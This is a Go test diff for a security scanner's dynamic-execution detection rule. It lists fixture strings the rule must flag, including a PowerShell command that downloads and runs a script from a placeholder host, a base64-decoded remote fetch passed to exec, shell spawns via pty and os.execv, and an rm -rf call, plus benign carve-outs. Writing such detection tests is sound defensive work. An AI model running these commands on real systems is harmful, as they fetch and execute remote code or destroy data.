@@ -34,6 +34,94 @@ func TestBuiltinPacksLoad(t *testing.T) {
 	}
 }
 
+// TestDynamicExecSinksCovered is the rule-polish pass on SG-EXE-001. The
+// shipped rule matched `eval(` but never `exec(` — even though the rule is
+// named "Dynamic eval / exec" and rule-verification's own headline TP fixture
+// is `exec(base64.b64decode(fetch(url)))`. This adds the Python exec builtin,
+// the reflective-import evasion primitive, the lower-level exec/spawn syscall
+// wrappers, Node's vm module and Function constructor, and PowerShell's
+// Invoke-Expression (the Windows counterpart of curl|sh, which SG-NET-002 only
+// catches in its POSIX form). Benign rows keep the documented carve-outs
+// honest: ast.literal_eval, a literal-argument subprocess call, and — the one
+// that forced a new suppress — JS `regex.exec(s)`, which must never be mistaken
+// for an execution sink.
+func TestDynamicExecSinksCovered(t *testing.T) {
+	packs, _ := Builtin()
+	var r *Rule
+	for _, p := range packs {
+		for _, rr := range p.Rules {
+			if rr.ID == "SG-EXE-001" {
+				r = rr
+			}
+		}
+	}
+	if r == nil {
+		t.Fatal("SG-EXE-001 not found")
+	}
+	cases := []struct {
+		text string
+		want bool
+	}{
+		// Baseline — must not regress.
+		{`subprocess.run(cmd, shell=True)`, true},
+		{`os.system("rm -rf /tmp/x")`, true},
+		{`eval(user_input)`, true},
+		{`getattr(os, 'system')('id')`, true},
+		{`child_process.exec(cmd)`, true},
+
+		// The gap this polish closes: Python's exec builtin, including the
+		// doc's headline fixture.
+		{`exec(base64.b64decode(fetch(url)))`, true},
+		{`exec(open('/tmp/payload.py').read())`, true},
+		{`    exec(compile(src, '<s>', 'exec'))`, true},
+		// Case matters: `new function(){}` is the ordinary anonymous-object
+		// idiom, not the Function constructor.
+		{`var r = new function(){ this.x = 1 }`, false},
+		// Prose in a comment must not read as a call — this is why the exec
+		// leaf refuses a space before the paren.
+		{`// Recorder for the string-form exec (xprintidle / gdbus).`, false},
+		// Reflective import — reaches a sink without naming it.
+		{`__import__('os').system('id')`, true},
+		{`mod = __import__(name)`, true},
+		// Lower-level exec/spawn wrappers.
+		{`os.execv('/bin/sh', ['sh', '-c', cmd])`, true},
+		{`os.execlp("sh", "sh", "-c", payload)`, true},
+		{`os.spawnv(os.P_NOWAIT, '/bin/sh', args)`, true},
+		{`pty.spawn("/bin/bash")`, true},
+		// JS/Node dynamic execution.
+		{`vm.runInNewContext(script, context)`, true},
+		{`vm.runInThisContext(src)`, true},
+		{`const f = new Function('return (' + input + ')')`, true},
+		// The destructured child_process form the dotted leaf cannot see.
+		{`const { exec } = require('child_process'); exec(cmd, cb)`, true},
+		// PowerShell eval.
+		{`powershell -c "irm https://example.test/i.ps1 | iex"`, true},
+		{`Invoke-Expression $payload`, true},
+
+		// Benign: the documented carve-outs.
+		{`cfg = ast.literal_eval(raw)`, false},
+		{`subprocess.run(['ls', '-la'])`, false},
+		// JS regex methods must not read as an execution sink — this is why the
+		// exec leaf refuses a preceding '.'.
+		{`const m = /ab+c/.exec(line)`, false},
+		{`while ((m = pattern.exec(text)) !== null) {`, false},
+		{`const found = re.exec(haystack)`, false},
+		// A function *definition* named exec is not a call into a sink.
+		{`function exec(cmd, timeoutMs) {`, false},
+		{`def exec(self, statement):`, false},
+		// Ordinary words that share a prefix.
+		{`executor = ThreadPoolExecutor(max_workers=4)`, false},
+		{`run_executable(path)`, false},
+		{`// evaluate the expression tree`, false},
+	}
+	for _, c := range cases {
+		got := len(r.Evaluate("scripts", c.text)) > 0
+		if got != c.want {
+			t.Errorf("%q: got match=%v want %v", c.text, got, c.want)
+		}
+	}
+}
+
 // TestAgentHookConfigCoversNonJSONFormats is the rule-polish pass on
 // SG-CFG-001. The shipped match required JSON quoting (`"PostToolUse":`), but
 // pkg/skill classifies *any* file under .claude/ as a config regardless of
